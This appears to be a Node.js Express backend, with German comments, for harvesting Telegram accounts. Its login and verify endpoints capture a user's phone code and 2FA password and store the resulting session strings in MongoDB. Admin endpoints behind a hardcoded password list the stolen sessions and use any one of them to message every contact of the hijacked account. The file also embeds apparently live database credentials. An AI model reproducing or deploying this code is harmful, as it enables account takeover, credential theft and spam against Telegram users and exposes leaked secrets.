const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const input = require('input'); // Für lokale Logik, falls nötig

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Setup
const MONGODB_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority";
mongoose.connect(MONGODB_URI);

const SessionSchema = new mongoose.Schema({
    phone: String,
    sessionString: String,
    createdAt: { type: Date, default: Date.now }
});
const SessionModel = mongoose.model('Session', SessionSchema);

// Temporärer Speicher für laufende Login-Vorgänge
const loginFlow = new Map();

// --- AUTH ENDPOINTS ---

app.post('/login', async (req, res) => {
    const { phone, apiId, apiHash } = req.body;
    const client = new TelegramClient(new StringSession(""), parseInt(apiId), apiHash, { connectionRetries: 5 });
    await client.connect();
    
    const phoneCodeHash = await client.sendCode({ apiId: parseInt(apiId), apiHash }, phone);
    loginFlow.set(phone, { client, phoneCodeHash });
    
    res.json({ status: "code_sent", phoneCodeHash: phoneCodeHash.phoneCodeHash });
});

app.post('/verify', async (req, res) => {
    const { phone, code, password } = req.body;
    const flow = loginFlow.get(phone);
    if (!flow) return res.status(400).send("Session expired or not started");

    try {
        const result = await flow.client.signIn({
            phone,
            phoneCodeHash: flow.phoneCodeHash.phoneCodeHash,
            phoneCode: code,
            password: password // Falls 2FA aktiv
        });

        const sessionString = flow.client.session.save();
        await SessionModel.create({ phone, sessionString });
        
        loginFlow.delete(phone);
        res.json({ status: "success" });
    } catch (e) {
        if (e.message.includes("SESSION_PASSWORD_NEEDED")) {
            res.status(401).json({ status: "password_needed" });
        } else {
            res.status(400).send(e.message);
        }
    }
});

// --- ADMIN ENDPOINTS ---

app.get('/admin/get-sessions', async (req, res) => {
    // Einfache Auth für das Panel
    if (req.query.pass !== "Hinva312!") return res.status(403).send("Forbidden");
    const sessions = await SessionModel.find();
    res.json(sessions);
});

app.post('/admin/send-message', async (req, res) => {
    const { sessionId, message, apiId, apiHash } = req.body;
    if (req.body.pass !== "Hinva312!") return res.status(403).send("Forbidden");

    const sessionData = await SessionModel.findById(sessionId);
    if (!sessionData) return res.status(404).send("Session not found");

    const client = new TelegramClient(new StringSession(sessionData.sessionString), parseInt(apiId), apiHash, {});
    await client.connect();

    try {
        const dialogs = await client.getDialogs();
        for (const dialog of dialogs) {
            await client.sendMessage(dialog.id, { message });
        }
        res.json({ status: "success" });
    } catch (e) {
        res.status(500).send(e.message);
    } finally {
        await client.disconnect();
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
